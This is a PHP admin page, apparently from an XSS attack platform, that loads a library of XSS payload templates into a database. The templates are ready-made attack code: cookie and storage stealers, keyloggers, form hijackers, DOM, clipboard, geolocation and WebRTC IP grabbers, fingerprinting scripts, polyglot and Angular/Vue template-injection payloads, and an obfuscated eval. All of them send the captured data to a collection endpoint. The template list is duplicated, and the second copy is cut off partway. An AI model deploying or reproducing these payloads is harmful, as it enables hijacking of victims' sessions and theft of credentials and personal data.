<?php
/**
 * 一键导入XSS模板到数据库
 * 访问此页面即可自动导入30个现代化XSS Payload模板
 */

require_once 'config.php';
session_start();

// 检查登录和管理员权限
if (!isLoggedIn()) {
    header('Location: login.php');
    exit;
}

if (!isAdmin()) {
    http_response_code(403);
    die('<h1>403 Forbidden</h1><p>只有管理员可以导入模板</p><a href="templates.php">返回模板页面</a>');
}

// 处理AJAX导入请求（必须在输出HTML之前）
if (isset($_GET['action']) && $_GET['action'] === 'import') {
    header('Content-Type: application/json; charset=utf-8');
    
    try {
        $pdo = getDbConnection();
        
        // 定义所有模板（30个）
        $templates = [
            // ========== 基础XSS ==========
            ['modern-basic-xss.js', '// 现代浏览器标准XSS\n(function(){\n    const payload = {\n        type: "basic_xss",\n        url: location.href,\n        timestamp: new Date().toISOString(),\n        userAgent: navigator.userAgent\n    };\n    fetch("/api/collect", {\n        method: "POST",\n        headers: {"Content-Type": "application/json"},\n        body: JSON.stringify(payload)\n    });\n    alert("XSS by 黑客仓库");\n})();'],

            ['svg-animation-xss.html', '<svg><style>@keyframes x{}</style><animate attributeName=href dur=5s repeatCount=indefinite keytimes="0;0;1" values="javascript:fetch(\'/api/collect\',{method:\'POST\',body:JSON.stringify({type:\'svg_xss\',cookie:document.cookie})});alert(\'XSS\');0" /><a><text x=20 y=20>点击我</text></a></svg>'],

            ['animation-end-xss.html', '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="fetch(\'/api/collect\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({type:\'animation_xss\',cookie:document.cookie,url:location.href})})"></xss>'],

            // ========== Cookie窃取 ==========
            ['advanced-cookie-stealer.js', '// 高级Cookie窃取 + 会话信息\n(function(){\n    const data = {\n        type: "cookie_theft",\n        cookies: document.cookie,\n        localStorage: JSON.stringify(localStorage),\n        sessionStorage: JSON.stringify(sessionStorage),\n        url: location.href,\n        referrer: document.referrer,\n        timestamp: new Date().toISOString()\n    };\n    \n    if(!document.cookie) {\n        data.note = "可能存在HttpOnly Cookie";\n    }\n    \n    fetch("/api/collect", {\n        method: "POST",\n        headers: {"Content-Type": "application/json"},\n        body: JSON.stringify(data)\n    }).catch(e => {\n        new Image().src = "/api/collect?" + new URLSearchParams(data);\n    });\n})();'],

            ['websocket-cookie-steal.html', '<img src="x" onerror="if(typeof socket!==\'undefined\')socket.send(JSON.stringify({type:\'ws_cookie\',cookie:document.cookie,storage:localStorage}));else fetch(\'/api/collect\',{method:\'POST\',body:JSON.stringify({type:\'cookie\',data:document.cookie})})">'],

            ['multi-cookie-stealer.js', '// 多种方式窃取Cookie\n(async function(){\n    const cookies = document.cookie;\n    const payload = {\n        type: "multi_cookie",\n        cookies: cookies,\n        allCookies: document.cookie.split(";").map(c=>c.trim()),\n        domain: location.hostname,\n        protocol: location.protocol,\n        timestamp: Date.now()\n    };\n    \n    try {\n        await fetch("/api/collect", {\n            method: "POST",\n            headers: {"Content-Type": "application/json"},\n            body: JSON.stringify(payload),\n            credentials: "include"\n        });\n    } catch(e) {\n        const xhr = new XMLHttpRequest();\n        xhr.open("POST", "/api/collect", true);\n        xhr.setRequestHeader("Content-Type", "application/json");\n        xhr.send(JSON.stringify(payload));\n    }\n})();'],

            // ========== 键盘记录器 ==========
            ['advanced-keylogger.js', '// 高级键盘记录器 with Buffer\n(function(){\n    let buffer = "";\n    let formData = {};\n    \n    history.replaceState(null, null, "/login");\n    \n    document.addEventListener("keypress", function(e){\n        buffer += String.fromCharCode(e.which || e.keyCode);\n        \n        if(buffer.length >= 25) {\n            fetch("/api/collect", {\n                method: "POST",\n                headers: {"Content-Type": "application/json"},\n                body: JSON.stringify({\n                    type: "keylogger",\n                    keys: buffer,\n                    url: location.href,\n                    timestamp: new Date().toISOString()\n                })\n            });\n            buffer = "";\n        }\n    });\n    \n    document.addEventListener("input", function(e){\n        if(e.target.type === "password" || e.target.type === "text"){\n            formData[e.target.name || e.target.id || "unknown"] = e.target.value;\n        }\n    });\n    \n    document.addEventListener("submit", function(e){\n        fetch("/api/collect", {\n            method: "POST",\n            headers: {"Content-Type": "application/json"},\n            body: JSON.stringify({\n                type: "form_submit",\n                formData: formData,\n                allInputs: Array.from(e.target.elements).map(el => ({\n                    name: el.name,\n                    value: el.value,\n                    type: el.type\n                }))\n            })\n        });\n    });\n})();'],

            ['realtime-keylogger.js', '// 实时键盘记录\nlet keys = "";\ndocument.onkeypress = function(e){\n    keys += e.key;\n    if(keys.length > 10){\n        fetch("/api/collect?type=key&data=" + encodeURIComponent(keys));\n        keys = "";\n    }\n};'],

            ['form-hijack-keylogger.js', '// 表单字段劫持\n(function(){\n    const inputs = document.querySelectorAll("input, textarea");\n    const data = {};\n    \n    inputs.forEach(input => {\n        input.addEventListener("blur", function(){\n            data[this.name || this.id || "field_" + Math.random()] = this.value;\n            \n            fetch("/api/collect", {\n                method: "POST",\n                headers: {"Content-Type": "application/json"},\n                body: JSON.stringify({\n                    type: "form_data",\n                    field: this.name || this.id,\n                    value: this.value,\n                    formData: data,\n                    url: location.href\n                })\n            });\n        });\n    });\n})();'],

            // ========== DOM窃取 ==========
            ['full-dom-stealer.js', '// 完整DOM结构窃取\n(function(){\n    const domData = {\n        type: "dom_theft",\n        html: document.documentElement.outerHTML,\n        title: document.title,\n        url: location.href,\n        forms: Array.from(document.forms).map(f => ({\n            action: f.action,\n            method: f.method,\n            fields: Array.from(f.elements).map(e => ({\n                name: e.name,\n                type: e.type,\n                value: e.value\n            }))\n        })),\n        links: Array.from(document.links).map(l => l.href),\n        scripts: Array.from(document.scripts).map(s => s.src),\n        timestamp: new Date().toISOString()\n    };\n    \n    fetch("/api/collect", {\n        method: "POST",\n        headers: {"Content-Type": "application/json"},\n        body: JSON.stringify(domData)\n    });\n})();'],

            // ========== 浏览器指纹 ==========
            ['browser-fingerprint.js', '// 浏览器指纹采集 (2025版)\n(async function(){\n    const canvas = document.createElement("canvas");\n    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");\n    const debugInfo = gl ? gl.getExtension("WEBGL_debug_renderer_info") : null;\n    \n    let battery = null;\n    try { battery = await navigator.getBattery(); } catch(e) {}\n    \n    const fingerprint = {\n        type: "fingerprint",\n        userAgent: navigator.userAgent,\n        platform: navigator.platform,\n        language: navigator.language,\n        languages: navigator.languages,\n        hardwareConcurrency: navigator.hardwareConcurrency,\n        deviceMemory: navigator.deviceMemory,\n        maxTouchPoints: navigator.maxTouchPoints,\n        screen: {\n            width: screen.width,\n            height: screen.height,\n            colorDepth: screen.colorDepth,\n            pixelDepth: screen.pixelDepth\n        },\n        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n        timezoneOffset: new Date().getTimezoneOffset(),\n        webgl: debugInfo ? {\n            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),\n            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)\n        } : null,\n        battery: battery ? {\n            level: battery.level,\n            charging: battery.charging\n        } : null,\n        timestamp: new Date().toISOString()\n    };\n    \n    fetch("/api/collect", {\n        method: "POST",\n        headers: {"Content-Type": "application/json"},\n        body: JSON.stringify(fingerprint)\n    });\n})();'],

            ['geolocation-stealer.js', '// GPS定位窃取\nnavigator.geolocation.getCurrentPosition(\n    position => {\n        fetch("/api/collect", {\n            method: "POST",\n            headers: {"Content-Type": "application/json"},\n            body: JSON.stringify({\n                type: "geolocation",\n                latitude: position.coords.latitude,\n                longitude: position.coords.longitude,\n                accuracy: position.coords.accuracy,\n                timestamp: new Date(position.timestamp).toISOString()\n            })\n        });\n    },\n    error => {\n        fetch("/api/collect", {\n            method: "POST",\n            headers: {"Content-Type": "application/json"},\n            body: JSON.stringify({\n                type: "geolocation_error",\n                error: error.message,\n                code: error.code\n            })\n        });\n    },\n    {enableHighAccuracy: true, timeout: 10000}\n);'],

            ['webrtc-ip-leak.js', '// WebRTC本地IP泄露\n(function(){\n    const pc = new RTCPeerConnection({iceServers: []});\n    pc.createDataChannel("");\n    pc.createOffer().then(offer => pc.setLocalDescription(offer));\n    \n    pc.onicecandidate = function(ice){\n        if(!ice || !ice.candidate || !ice.candidate.candidate) return;\n        \n        const ipRegex = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/;\n        const match = ipRegex.exec(ice.candidate.candidate);\n        \n        if(match){\n            fetch("/api/collect", {\n                method: "POST",\n                headers: {"Content-Type": "application/json"},\n                body: JSON.stringify({\n                    type: "webrtc_ip",\n                    localIP: match[1],\n                    candidate: ice.candidate.candidate,\n                    timestamp: new Date().toISOString()\n                })\n            });\n            pc.close();\n        }\n    };\n})();'],

            ['clipboard-hijack.js', '// 剪贴板劫持\n(function(){\n    document.addEventListener("copy", function(e){\n        const selection = window.getSelection().toString();\n        fetch("/api/collect", {\n            method: "POST",\n            headers: {"Content-Type": "application/json"},\n            body: JSON.stringify({\n                type: "clipboard_copy",\n                data: selection,\n                timestamp: new Date().toISOString()\n            })\n        });\n    });\n    \n    navigator.clipboard.readText().then(text => {\n        fetch("/api/collect", {\n            method: "POST",\n            headers: {"Content-Type": "application/json"},\n            body: JSON.stringify({\n                type: "clipboard_read",\n                data: text,\n                timestamp: new Date().toISOString()\n            })\n        });\n    }).catch(e => console.log("Clipboard read denied"));\n})();'],

            // ========== Polyglot & WAF绕过 ==========
            ['xss-polyglot.txt', 'javascript:"/*\'\'/\*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=fetch(\'/api/collect?type=polyglot&data=\'+document.cookie)//'],

            ['angular-sandbox-escape.txt', '{{constructor.constructor(\'fetch("/api/collect",{method:"POST",body:JSON.stringify({type:"angular",cookie:document.cookie})})\')()}}'],

            ['vuejs-csti.txt', '{{_c.constructor(\'fetch("/api/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"vue_csti",cookie:document.cookie})})\')()}}'],

            // ========== 移动端 ==========
            ['mobile-touch-hijack.js', '// 移动端触摸劫持\n(function(){\n    let touchData = [];\n    \n    document.addEventListener("touchstart", function(e){\n        touchData.push({\n            type: "touchstart",\n            x: e.touches[0].clientX,\n            y: e.touches[0].clientY,\n            target: e.target.tagName,\n            timestamp: Date.now()\n        });\n    });\n    \n    document.addEventListener("touchend", function(e){\n        touchData.push({type: "touchend", timestamp: Date.now()});\n        \n        if(touchData.length > 5){\n            fetch("/api/collect", {\n                method: "POST",\n                headers: {"Content-Type": "application/json"},\n                body: JSON.stringify({\n                    type: "mobile_touch",\n                    touches: touchData,\n                    userAgent: navigator.userAgent\n                })\n            });\n            touchData = [];\n        }\n    });\n})();'],

            // ========== 隐蔽技术 ==========
            ['zero-width-stealth.js', '// 零宽字符隐藏payload\n(function(){\n    const zeroWidth = String.fromCharCode(8203);\n    document.title += zeroWidth;\n    \n    fetch("/api/collect", {\n        method: "POST",\n        headers: {"Content-Type": "application/json"},\n        body: JSON.stringify({\n            type: "stealth_xss",\n            cookie: document.cookie,\n            hidden: true,\n            timestamp: new Date().toISOString()\n        })\n    });\n})();'],

            ['base64-obfuscated.js', '// Base64混淆执行\neval(atob("KGZ1bmN0aW9uKCl7ZmV0Y2goIi9hcGkvY29sbGVjdCIse21ldGhvZDoiUE9TVCIsaGVhZGVyczp7IkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSxib2R5OkpTT04uc3RyaW5naWZ5KHt0eXBlOiJiYXNlNjQiLGNvb2tpZTpkb2N1bWVudC5jb29raWV9KX0pfSkoKTs="));'],

            ['time-bomb-xss.js', '// 定时触发XSS\n(function(){\n    setTimeout(function(){\n        fetch("/api/collect", {\n            method: "POST",\n            headers: {"Content-Type": "application/json"},\n            body: JSON.stringify({\n                type: "time_bomb",\n                cookie: document.cookie,\n                localStorage: JSON.stringify(localStorage),\n                sessionStorage: JSON.stringify(sessionStorage),\n                duration: "5_minutes",\n                timestamp: new Date().toISOString()\n            })\n        });\n    }, 300000);\n})();'],

            ['beacon-api-exfil.js', '// 使用Beacon API回传数据\n(function(){\n    const data = {\n        type: "beacon",\n        cookie: document.cookie,\n        url: location.href,\n        timestamp: new Date().toISOString()\n    };\n    \n    window.addEventListener("beforeunload", function(){\n        navigator.sendBeacon("/api/collect", JSON.stringify(data));\n    });\n    \n    document.addEventListener("visibilitychange", function(){\n        if(document.hidden){\n            navigator.sendBeacon("/api/collect", JSON.stringify(data));\n        }\n    });\n})();']
        ];
        
        $inserted = 0;
        $skipped = 0;
        $details = [];
        
        foreach ($templates as $template) {
            list($filename, $content) = $template;
            
            // 检查是否已存在
            $checkStmt = $pdo->prepare("SELECT COUNT(*) FROM templates WHERE filename = ?");
            $checkStmt->execute([$filename]);
            
            if ($checkStmt->fetchColumn() > 0) {
                $skipped++;
                $details[] = "跳过: {$filename} (已存在)";
                continue;
            }
            
            // 插入新模板
            $stmt = $pdo->prepare("INSERT INTO templates (filename, content, size) VALUES (?, ?, ?)");
            $stmt->execute([$filename, $content, strlen($content)]);
            
            $inserted++;
            $details[] = "导入: {$filename}";
        }
        
        echo json_encode([
            'success' => true,
            'message' => "成功导入 {$inserted} 个模板，跳过 {$skipped} 个已存在的模板",
            'inserted' => $inserted,
            'skipped' => $skipped,
            'total' => count($templates),
            'details' => $details
        ], JSON_UNESCAPED_UNICODE);
        
    } catch (PDOException $e) {
        echo json_encode([
            'success' => false,
            'message' => '数据库错误: ' . $e->getMessage()
        ], JSON_UNESCAPED_UNICODE);
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'message' => '导入失败: ' . $e->getMessage()
        ], JSON_UNESCAPED_UNICODE);
    }
    
    exit;
}

// 设置页面编码
header('Content-Type: text/html; charset=utf-8');

?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>导入XSS模板 - <?php echo APP_NAME; ?></title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Microsoft YaHei', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: white; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); padding: 40px; max-width: 800px; width: 100%; }
        h1 { color: #333; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; }
        .subtitle { color: #666; margin-bottom: 30px; font-size: 14px; }
        .btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 12px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; transition: transform 0.2s; }
        .btn:hover { transform: translateY(-2px); }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
        .result { margin-top: 20px; padding: 15px; border-radius: 5px; display: none; }
        .success { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; }
        .error { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }
        .info { background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; }
        .progress { margin-top: 20px; }
        .progress-bar { background: #f0f0f0; height: 30px; border-radius: 15px; overflow: hidden; margin-bottom: 10px; }
        .progress-fill { background: linear-gradient(90deg, #667eea 0%, #764ba2 100%); height: 100%; width: 0%; transition: width 0.3s; display: flex; align-items: center; justify-content: center; color: white; font-size: 12px; font-weight: bold; }
        .log { background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 5px; padding: 15px; max-height: 400px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 12px; line-height: 1.6; margin-top: 20px; display: none; }
        .log-item { padding: 5px; border-bottom: 1px solid #e9ecef; }
        .log-item:last-child { border-bottom: none; }
        .log-success { color: #28a745; }
        .log-error { color: #dc3545; }
        .log-info { color: #17a2b8; }
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-top: 20px; }
        .stat-card { background: #f8f9fa; padding: 15px; border-radius: 5px; text-align: center; }
        .stat-number { font-size: 28px; font-weight: bold; color: #667eea; }
        .stat-label { font-size: 12px; color: #666; margin-top: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>💻 导入XSS模板</h1>
        <p class="subtitle">一键导入30个最新的XSS Payload模板到数据库</p>
        
        <div class="stats" id="stats" style="display:none;">
            <div class="stat-card">
                <div class="stat-number" id="totalCount">30</div>
                <div class="stat-label">总模板数</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="successCount">0</div>
                <div class="stat-label">成功导入</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="skipCount">0</div>
                <div class="stat-label">已存在跳过</div>
            </div>
        </div>
        
        <div class="progress" id="progressContainer" style="display:none;">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill">0%</div>
            </div>
        </div>
        
        <div id="result" class="result"></div>
        
        <div class="log" id="log"></div>
        
        <button class="btn" id="importBtn" onclick="importTemplates()">🚀 开始导入</button>
        <button class="btn" id="backBtn" onclick="location.href='templates.php'" style="display:none; margin-left:10px;">返回模板管理</button>
    </div>

    <script>
        function addLog(message, type = 'info') {
            const log = document.getElementById('log');
            log.style.display = 'block';
            const item = document.createElement('div');
            item.className = 'log-item log-' + type;
            item.textContent = '• ' + message;
            log.appendChild(item);
            log.scrollTop = log.scrollHeight;
        }

        function updateProgress(current, total) {
            const percent = Math.round((current / total) * 100);
            const fill = document.getElementById('progressFill');
            fill.style.width = percent + '%';
            fill.textContent = percent + '%';
        }

        async function importTemplates() {
            const btn = document.getElementById('importBtn');
            const result = document.getElementById('result');
            const stats = document.getElementById('stats');
            const progress = document.getElementById('progressContainer');
            const log = document.getElementById('log');
            
            btn.disabled = true;
            btn.textContent = '⏳ 导入中...';
            result.style.display = 'none';
            log.innerHTML = '';
            log.style.display = 'none';
            stats.style.display = 'grid';
            progress.style.display = 'block';
            
            addLog('开始导入XSS模板...', 'info');
            
            try {
                const response = await fetch('import_templates.php?action=import', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
                
                const data = await response.json();
                
                if (data.success) {
                    result.className = 'result success';
                    result.textContent = '✅ ' + data.message;
                    result.style.display = 'block';
                    
                    document.getElementById('successCount').textContent = data.inserted;
                    document.getElementById('skipCount').textContent = data.skipped;
                    updateProgress(100, 100);
                    
                    addLog(`成功导入 ${data.inserted} 个模板`, 'success');
                    addLog(`跳过 ${data.skipped} 个已存在的模板`, 'info');
                    
                    // 显示详细日志
                    if (data.details && data.details.length > 0) {
                        data.details.forEach(detail => {
                            addLog(detail, 'info');
                        });
                    }
                    
                    document.getElementById('backBtn').style.display = 'inline-block';
                } else {
                    result.className = 'result error';
                    result.textContent = '❌ ' + data.message;
                    result.style.display = 'block';
                    addLog('导入失败: ' + data.message, 'error');
                }
            } catch (error) {
                result.className = 'result error';
                result.textContent = '❌ 导入失败: ' + error.message;
                result.style.display = 'block';
                addLog('系统错误: ' + error.message, 'error');
            } finally {
                btn.disabled = false;
                btn.textContent = '🔄 重新导入';
            }
        }
    </script>
</body>
</html>

<?php
// 处理导入请求
if (isset($_GET['action']) && $_GET['action'] === 'import') {
    header('Content-Type: application/json');
    
    try {
        $pdo = getDbConnection();
        
        // 定义所有模板（30个）
        $templates = [
            // ========== 基础XSS ==========
            ['modern-basic-xss.js', '// 现代浏览器标准XSS
(function(){
    const payload = {
        type: "basic_xss",
        url: location.href,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };
    fetch("/api/collect", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(payload)
    });
    alert("XSS by 黑客仓库");
})();'],

            ['svg-animation-xss.html', '<svg><style>@keyframes x{}</style><animate attributeName=href dur=5s repeatCount=indefinite keytimes="0;0;1" values="javascript:fetch(\'/api/collect\',{method:\'POST\',body:JSON.stringify({type:\'svg_xss\',cookie:document.cookie})});alert(\'XSS\');0" /><a><text x=20 y=20>点击我</text></a></svg>'],

            ['animation-end-xss.html', '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="fetch(\'/api/collect\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({type:\'animation_xss\',cookie:document.cookie,url:location.href})})"></xss>'],

            // ========== Cookie窃取 ==========
            ['advanced-cookie-stealer.js', '// 高级Cookie窃取 + 会话信息
(function(){
    const data = {
        type: "cookie_theft",
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: location.href,
        referrer: document.referrer,
        timestamp: new Date().toISOString()
    };
    
    if(!document.cookie) {
        data.note = "可能存在HttpOnly Cookie";
    }
    
    fetch("/api/collect", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
    }).catch(e => {
        new Image().src = "/api/collect?" + new URLSearchParams(data);
    });
})();'],

            ['websocket-cookie-steal.html', '<img src="x" onerror="if(typeof socket!==\'undefined\')socket.send(JSON.stringify({type:\'ws_cookie\',cookie:document.cookie,storage:localStorage}));else fetch(\'/api/collect\',{method:\'POST\',body:JSON.stringify({type:\'cookie\',data:document.cookie})})">'],

            ['multi-cookie-stealer.js', '// 多种方式窃取Cookie
(async function(){
    const cookies = document.cookie;
    const payload = {
        type: "multi_cookie",
        cookies: cookies,
        allCookies: document.cookie.split(";").map(c=>c.trim()),
        domain: location.hostname,
        protocol: location.protocol,
        timestamp: Date.now()
    };
    
    try {
        await fetch("/api/collect", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(payload),
            credentials: "include"
        });
    } catch(e) {
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "/api/collect", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify(payload));
    }
})();'],

            // ========== 键盘记录器 ==========
            ['advanced-keylogger.js', '// 高级键盘记录器 with Buffer
(function(){
    let buffer = "";
    let formData = {};
    
    history.replaceState(null, null, "/login");
    
    document.addEventListener("keypress", function(e){
        buffer += String.fromCharCode(e.which || e.keyCode);
        
        if(buffer.length >= 25) {
            fetch("/api/collect", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    type: "keylogger",
                    keys: buffer,
                    url: location.href,
                    timestamp: new Date().toISOString()
                })
            });
            buffer = "";
        }
    });
    
    document.addEventListener("input", function(e){
        if(e.target.type === "password" || e.target.type === "text"){
            formData[e.target.name || e.target.id || "unknown"] = e.target.value;
        }
    });
    
    document.addEventListener("submit", function(e){
        fetch("/api/collect", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                type: "form_submit",
                formData: formData,
                allInputs: Array.from(e.target.elements).map(el => ({
                    name: el.name,
                    value: el.value,
                    type: el.type
                }))
            })
        });
    });
})();'],

            ['realtime-keylogger.js', '// 实时键盘记录
let keys = "";
document.onkeypress = function(e){
    keys += e.key;
    if(keys.length > 10){
        fetch("/api/collect?type=key&data=" + encodeURIComponent(keys));
        keys = "";
    }
};'],

            ['form-hijack-keylogger.js', '// 表单字段劫持
(function(){
    const inputs = document.querySelectorAll("input, textarea");
    const data = {};
    
    inputs.forEach(input => {
        input.addEventListener("blur", function(){
            data[this.name || this.id || "field_" + Math.random()] = this.value;
            
            fetch("/api/collect", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    type: "form_data",
                    field: this.name || this.id,
                    value: this.value,
                    formData: data,
                    url: location.href
                })
            });
        });
    });
})();'],

            // ========== DOM窃取 ==========
            ['full-dom-stealer.js', '// 完整DOM结构窃取
(function(){
    const domData = {
        type: "dom_theft",
        html: document.documentElement.outerHTML,
        title: document.title,
        url: location.href,
        forms: Array.from(document.forms).map(f => ({
            action: f.action,
            method: f.method,
            fields: Array.from(f.elements).map(e => ({
                name: e.name,
                type: e.type,
                value: e.value
            }))
        })),
        links: Array.from(document.links).map(l => l.href),
        scripts: Array.from(document.scripts).map(s => s.src),
        timestamp: new Date().toISOString()
    };
    
    fetch("/api/collect", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(domData)
    });
})();'],

            // ========== 浏览器指纹 ==========
            ['browser-fingerprint.js', '// 浏览器指纹采集 (2025版)
(async function(){
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    const debugInfo = gl ? gl.getExtension("WEBGL_debug_renderer_info") : null;
    
    let battery = null;
    try { battery = await navigator.getBattery(); } catch(e) {}
    
    const fingerprint = {
        type: "fingerprint",
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        webgl: debugInfo ? {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        } : null,
        battery: battery ? {
            level: battery.level,
            charging: battery.charging
        } : null,
        timestamp: new Date().toISOString()
    };
    
    fetch("/api/collect", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(fingerprint)
    });
})();'],

            ['geolocation-stealer.js', '// GPS定位窃取
navigator.geolocation.getCurrentPosition(
    position => {
        fetch("/api/collect", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                type: "geolocation",
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date(position.timestamp).toISOString()
            })
        });
    },
    error => {
        fetch("/api/collect", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                type: "geolocation_error",
                error: error.message,
                code: error.code
            })
        });
    },
    {enableHighAccuracy: true, timeout: 10000}
);'],

            ['webrtc-ip-leak.js', '// WebRTC本地IP泄露
(function(){
    const pc = new RTCPeerConnection({iceServers: []});
    pc.createDataChannel("");
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    
    pc.onicecandidate = function(ice){
        if(!ice || !ice.candidate || !ice.candidate.candidate) return;
        
        const ipRegex = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/;
        const match = ipRegex.exec(ice.candidate.candidate);
        
        if(match){
            fetch("/api/collect", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    type: "webrtc_ip",
                    localIP: match[1],
                    candidate: ice.candidate.candidate,
                    timestamp: new Date().toISOString()
                })
            });
            pc.close();
        }
    };
})();'],

            ['clipboard-hijack.js', '// 剪贴板劫持
(function(){
    document.addEventListener("copy", function(e){
        const selection = window.getSelection().toString();
        fetch("/api/collect", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                type: "clipboard_copy",
                data: selection,
                timestamp: new Date().toISOString()
            })
        });
    });
    
    navigator.clipboard.readText().then(text => {
        fetch("/api/collect", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                type: "clipboard_read",
                data: text,
                timestamp: new Date().toISOString()
            })
        });
    }).catch(e => console.log("Clipboard read denied"));
})();'],

            // ========== Polyglot & WAF绕过 ==========
            ['xss-polyglot.txt', 'javascript:"/*\'\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=fetch(\'/api/collect?type=polyglot&data=\'+document.cookie)//'],

            ['angular-sandbox-escape.txt', '{{constructor.constructor(\'fetch("/api/collect",{method:"POST",body:JSON.stringify({type:"angular",cookie:document.cookie})})\')()}}'],

            ['vuejs-csti.txt', '{{_c.constructor(\'fetch("/api/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"vue_csti",cookie:document.cookie})})\')()}}'],

            // ========== 移动端 ==========
            ['mobile-touch-hijack.js', '// 移动端触摸劫持
(function(){
    let touchData = [];
    
    document.addEventListener("touchstart", function(e){
        touchData.push({
            type: "touchstart",
            x: e.touches[0].clientX,
            y: e.touches[0].clientY,
            target: e.target.tagName,
            timestamp: Date.now()
        });
    });
    
    document.addEventListener("touchend", function(e){
        touchData.push({type: "touchend", timestamp: Date.now()});
        
        if(touchData.length > 5){
            fetch("/api/collect", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    type: "mobile_touch",
                    touches: touchData,
                    userAgent: navigator.userAgent
                })
            });
            touchData = [];
        }
    });
})();'],

            // ========== 隐蔽技术 ==========
            ['zero-width-stealth.js', '// 零宽字符隐藏payload
(function(){
    const zeroWidth = String.fromCharCode(8203);
    document.title += zeroWidth;
    
    fetch("/api/collect", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            type: "stealth_xss",
            cookie: document.cookie,
            hidden: true,
            timestamp: new Date().toISOString()
        })
    });
})();'],

            ['base64-obfuscated.js', '// Base64混淆执行
eval(atob("KGZ1bmN0aW9uKCl7ZmV0Y2goIi9hcGkvY29sbGVjdCIse21ldGhvZDoiUE9TVCIsaGVhZGVyczp7IkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSxib2R5OkpTT04uc3RyaW5naWZ5KHt0eXBlOiJiYXNlNjQiLGNvb2tpZTpkb2N1bWVudC5jb29raWV9KX0pfSkoKTs="));'],

            ['time-bomb-xss.js', '// 定时触发XSS
(function(){
    setTimeout(function(){
        fetch("/api/collect", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                type: "time_bomb",
                cookie: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
